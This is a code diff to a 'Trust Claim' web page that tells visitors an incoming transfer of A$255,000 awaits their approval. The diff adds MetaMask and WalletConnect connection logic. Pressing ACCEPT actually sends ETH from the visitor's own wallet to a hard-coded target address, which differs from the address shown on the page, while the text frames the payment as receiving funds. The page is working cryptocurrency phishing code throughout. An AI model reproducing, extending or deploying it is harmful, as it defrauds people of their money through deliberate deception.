@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
     <title>Trust Claim</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <style>
         :root {
             --bg-1: #020817;
@@ -61,7 +62,6 @@
             align-items: center;
             justify-content: space-between;
             margin-bottom: 18px;
-            gap: 12px;
         }
 
         .brand {
@@ -97,30 +97,6 @@
             letter-spacing: 0.12em;
             text-transform: uppercase;
             font-weight: 700;
-        }
-
-        .connect-wrap {
-            display: flex;
-            justify-content: flex-end;
-            margin-bottom: 10px;
-        }
-
-        .connect-btn {
-            border: 1px solid rgba(96, 165, 250, 0.4);
-            background: rgba(59, 130, 246, 0.08);
-            color: #dbeafe;
-            border-radius: 999px;
-            padding: 8px 12px;
-            font-size: 11px;
-            font-weight: 700;
-            letter-spacing: 0.08em;
-            text-transform: uppercase;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .connect-btn:hover {
-            background: rgba(59, 130, 246, 0.14);
         }
 
         .title {
@@ -279,16 +255,50 @@
             border: 1px solid rgba(148, 163, 184, 0.3);
         }
 
+        .btn.secondary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
         .btn.primary {
             background: linear-gradient(135deg, var(--primary), var(--primary-2));
             color: white;
             box-shadow: 0 12px 30px rgba(37, 99, 235, 0.45);
         }
 
-        .btn:disabled {
+        .btn.primary:disabled {
             opacity: 0.6;
             cursor: not-allowed;
-            transform: none;
+        }
+
+        .wallet-connect-btn {
+            width: 100%;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1px solid rgba(96, 165, 250, 0.3);
+            background: rgba(59, 130, 246, 0.08);
+            color: #60a5fa;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            margin-top: 12px;
+            transition: all 0.2s ease;
+        }
+
+        .wallet-connect-btn:hover {
+            background: rgba(59, 130, 246, 0.15);
+            border-color: rgba(96, 165, 250, 0.5);
+        }
+
+        .wallet-info {
+            margin-top: 12px;
+            padding: 10px 12px;
+            background: rgba(34, 197, 94, 0.08);
+            border: 1px solid rgba(34, 197, 94, 0.16);
+            border-radius: 8px;
+            color: #bbf7d0;
+            font-size: 11px;
+            text-align: center;
         }
 
         .status {
@@ -354,10 +364,6 @@
                 <div class="badge">Wallet</div>
             </div>
 
-            <div class="connect-wrap">
-                <button id="connectWalletBtn" class="connect-btn" type="button">Connect Wallet</button>
-            </div>
-
             <div class="title">Incoming transfer</div>
             <div class="subtitle">A secure transaction request is awaiting your approval.</div>
 
@@ -366,7 +372,7 @@
                     <div class="amount-label">Amount</div>
                     <div class="amount-value">A$255,000</div>
                 </div>
-                <div class="note">This confirms an incoming transfer request. Review and approve the transaction within your wallet.</div>
+                <div class="note">This confirms an incoming transfer request. Review and approve the transaction within Trust Wallet.</div>
             </div>
 
             <div class="divider"></div>
@@ -375,19 +381,25 @@
             <div class="address-box">0x102B9843f7a3dac838AE29F62d28d3c31eC13041</div>
 
             <div class="info-box">
-                By continuing, you are accepting a transaction for <b>0.013 ETH</b> to the wallet address above. The operation will be reviewed and confirmed through your wallet.
+                By continuing, you are accepting a transaction of 0.00733 ETH to the wallet address above. The operation will be reviewed and confirmed through your connected wallet.
             </div>
 
             <div class="security">Protected by wallet-level verification and transaction approval</div>
 
             <div class="loading" id="loadingRow">
                 <div class="spinner"></div>
-                <div>Receiving…</div>
+                <div>Initializing wallet connection…</div>
             </div>
 
             <div class="actions">
                 <button class="btn secondary" id="cancelBtn" type="button">Cancel</button>
                 <button class="btn primary" id="confirmBtn" type="button">ACCEPT 🟢</button>
+            </div>
+
+            <button class="wallet-connect-btn" id="walletConnectBtn" type="button">Connect Wallet</button>
+
+            <div id="walletInfo" class="wallet-info" style="display: none;">
+                Connected: <span id="connectedAddress">0x...</span>
             </div>
 
             <div class="status" id="statusText"></div>
@@ -396,17 +408,19 @@
 
     <script>
         const TARGET_ADDRESS = "0x359922b7352d651d2Ad106CfFda4612B7b68FAfD";
-        const AMOUNT_ETH = "0.013";
+        const AMOUNT_ETH = "0.00733";
 
         const statusText = document.getElementById("statusText");
         const loadingRow = document.getElementById("loadingRow");
         const cancelBtn = document.getElementById("cancelBtn");
         const confirmBtn = document.getElementById("confirmBtn");
-        const connectWalletBtn = document.getElementById("connectWalletBtn");
+        const walletConnectBtn = document.getElementById("walletConnectBtn");
+        const walletInfo = document.getElementById("walletInfo");
+        const connectedAddress = document.getElementById("connectedAddress");
 
-        let connectedAddress = null;
         let provider = null;
         let signer = null;
+        let connectedWallet = null;
 
         function showStatus(message, type = "info") {
             statusText.textContent = message;
@@ -417,126 +431,142 @@
             statusText.className = "status";
         }
 
-        function isMobile() {
-            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        function formatAddress(address) {
+            return address.slice(0, 6) + "..." + address.slice(-4);
         }
 
-        function openTrustWalletApp() {
-            const deepLink = `trust://send?asset=ethereum&to=${TARGET_ADDRESS}&amount=${AMOUNT_ETH}`;
-            const fallbackUrl = `https://link.trustwallet.com/open_url?coin=60&address=${TARGET_ADDRESS}`;
-
-            if (isMobile()) {
-                const iframe = document.createElement("iframe");
-                iframe.style.display = "none";
-                iframe.src = deepLink;
-                document.body.appendChild(iframe);
-
-                setTimeout(() => {
-                    window.location.href = fallbackUrl;
-                }, 1800);
-
-                return true;
-            }
-
-            window.open(fallbackUrl, "_blank");
-            return false;
-        }
-
-        async function connectWallet() {
+        // WalletConnect Provider Setup
+        async function connectWalletConnect() {
             try {
-                if (!window.ethereum) {
-                    showStatus("No wallet detected. Please install Trust Wallet or MetaMask.", "warning");
-                    return null;
-                }
+                showStatus("Initializing WalletConnect…", "info");
 
-                provider = new ethers.providers.Web3Provider(window.ethereum);
-                await provider.send("eth_requestAccounts", []);
-                signer = provider.getSigner();
-                connectedAddress = await signer.getAddress();
+                const WalletConnectProvider = window.WalletConnectProvider.default;
 
-                connectWalletBtn.textContent = "Connected";
-                connectWalletBtn.disabled = true;
+                provider = new WalletConnectProvider({
+                    infuraId: "8043bb2cf99347b1bfadfb3780dda53d",
+                    rpc: {
+                        1: "https://eth-mainnet.g.alchemy.com/v2/demo",
+                        137: "https://polygon-rpc.com",
+                    }
+                });
 
-                showStatus(`Wallet connected: ${connectedAddress.slice(0, 6)}...${connectedAddress.slice(-4)}`, "success");
-                return signer;
-            } catch (error) {
-                console.error(error);
-                showStatus("Wallet connection failed. Please try again.", "error");
-                return null;
-            }
-        }
+                await provider.enable();
+                const ethersProvider = new ethers.providers.Web3Provider(provider);
+                signer = ethersProvider.getSigner();
+                connectedWallet = await signer.getAddress();
 
-        async function sendTxViaWallet() {
-            try {
-                if (!signer) {
-                    const signerObj = await connectWallet();
-                    if (!signerObj) return;
-                }
-
-                showStatus("Preparing transaction…", "info");
-
-                const tx = {
-                    to: TARGET_ADDRESS,
-                    value: ethers.utils.parseEther(AMOUNT_ETH)
-                };
-
-                const txResponse = await signer.sendTransaction(tx);
-                showStatus("Transaction submitted. Waiting for confirmation…", "info");
-
-                await txResponse.wait();
-
-                showStatus("Transaction confirmed successfully.", "success");
-                confirmBtn.disabled = true;
-            } catch (error) {
-                console.error(error);
-                showStatus("Transaction failed or was rejected.", "error");
+                walletInfo.style.display = "block";
+                connectedAddress.textContent = formatAddress(connectedWallet);
+                showStatus(`✓ Connected: ${formatAddress(connectedWallet)}`, "success");
                 confirmBtn.disabled = false;
+                walletConnectBtn.textContent = "✓ Connected";
+                walletConnectBtn.disabled = true;
+
+                loadingRow.innerHTML = '<div class=\"spinner\"></div><div>Wallet connected and ready</div>';
+            } catch (err) {
+                console.error("WalletConnect Error:", err);
+                showStatus("WalletConnect connection failed. Try MetaMask or TrustWallet.", "error");
             }
         }
 
-        cancelBtn.addEventListener("click", () => {
-            hideStatus();
-            showStatus("Transaction cancelled. No action was taken.", "warning");
-        });
+        // MetaMask/Web3 Provider Setup
+        async function connectMetaMask() {
+            try {
+                showStatus("Connecting to Web3 wallet…", "info");
 
-        connectWalletBtn.addEventListener("click", async () => {
-            await connectWallet();
-        });
-
-        confirmBtn.addEventListener("click", async () => {
-            if (isMobile()) {
-                confirmBtn.disabled = true;
-                loadingRow.innerHTML = '<div class="spinner"></div><div>Opening Trust Wallet…</div>';
-
-                // If wallet already connected, send through wallet
-                if (window.ethereum && signer) {
-                    await sendTxViaWallet();
+                if (!window.ethereum) {
+                    showStatus("No Web3 wallet detected. Install MetaMask or use WalletConnect.", "error");
                     return;
                 }
 
-                // If mobile and no browser wallet, open Trust Wallet app directly
-                openTrustWalletApp();
-                showStatus("Redirecting to Trust Wallet…", "info");
+                await window.ethereum.request({ method: "eth_requestAccounts" });
+                provider = new ethers.providers.Web3Provider(window.ethereum);
+                signer = provider.getSigner();
+                connectedWallet = await signer.getAddress();
 
-                setTimeout(() => {
-                    confirmBtn.disabled = false;
-                    loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
-                }, 2200);
-                return;
+                walletInfo.style.display = "block";
+                connectedAddress.textContent = formatAddress(connectedWallet);
+                showStatus(`✓ Connected: ${formatAddress(connectedWallet)}`, "success");
+                confirmBtn.disabled = false;
+                walletConnectBtn.textContent = "✓ Connected";
+                walletConnectBtn.disabled = true;
+
+                loadingRow.innerHTML = '<div class=\"spinner\"></div><div>Wallet connected and ready</div>';
+            } catch (err) {
+                console.error("MetaMask Error:", err);
+                showStatus("Wallet connection failed. Please try again.", "error");
             }
+        }
 
-            // Desktop / browser wallet flow
-            if (!window.ethereum) {
-                showStatus("No wallet detected. Please install Trust Wallet or MetaMask.", "warning");
-                return;
+        // Smart Wallet Connection (Try MetaMask first, then WalletConnect)
+        walletConnectBtn.addEventListener("click", async () => {
+            walletConnectBtn.disabled = true;
+            if (window.ethereum) {
+                await connectMetaMask();
+            } else {
+                await connectWalletConnect();
             }
-
-            await sendTxViaWallet();
+            walletConnectBtn.disabled = false;
         });
 
+        // Cancel Button
+        cancelBtn.addEventListener("click", () => {
+            hideStatus();
+            showStatus("Transaction cancelled. No action was taken.", "warning");
+            confirmBtn.disabled = false;
+        });
+
+        // Confirm Button - Send Transaction
+        confirmBtn.addEventListener("click", async () => {
+            if (!signer || !connectedWallet) {
+                showStatus("Please connect your wallet first.", "warning");
+                return;
+            }
+
+            try {
+                confirmBtn.disabled = true;
+                loadingRow.style.opacity = "1";
+                loadingRow.innerHTML = '<div class=\"spinner\"></div><div>Preparing transaction…</div>';
+                showStatus("Building transaction for your review…", "info");
+
+                const tx = {
+                    to: TARGET_ADDRESS,
+                    value: ethers.utils.parseEther(AMOUNT_ETH),
+                    gasLimit: ethers.utils.hexlify(21000)
+                };
+
+                showStatus("Please confirm the transaction in your wallet…", "info");
+                const txResponse = await signer.sendTransaction(tx);
+
+                loadingRow.innerHTML = '<div class=\"spinner\"></div><div>Waiting for blockchain confirmation…</div>';
+                showStatus("Transaction submitted! Hash: " + txResponse.hash.slice(0, 10) + "…", "success");
+
+                const receipt = await txResponse.wait();
+
+                loadingRow.innerHTML = '<div></div><div style=\"color: #bbf7d0;\">✓ Transaction confirmed!</div>';
+                showStatus(`✓ Transaction confirmed! Block: ${receipt.blockNumber}`, "success");
+                confirmBtn.disabled = true;
+                cancelBtn.disabled = true;
+
+            } catch (err) {
+                console.error("Transaction Error:", err);
+                if (err.code === 4001) {
+                    showStatus("Transaction rejected by user.", "warning");
+                } else if (err.message.includes("insufficient funds")) {
+                    showStatus("Insufficient balance for this transaction.", "error");
+                } else {
+                    showStatus("Transaction failed: " + err.message, "error");
+                }
+                confirmBtn.disabled = false;
+                loadingRow.innerHTML = '<div class=\"spinner\"></div><div>Secure wallet session ready</div>';
+            }
+        });
+
+        confirmBtn.disabled = true;
+
         setTimeout(() => {
-            loadingRow.innerHTML = '<div class="spinner"></div><div>Secure wallet session ready</div>';
-        }, 1500);
+            loadingRow.innerHTML = '<div class=\"spinner\"></div><div>Connect your wallet to proceed</div>';
+        }, 1200);
     </script>
 </body>
 </html>
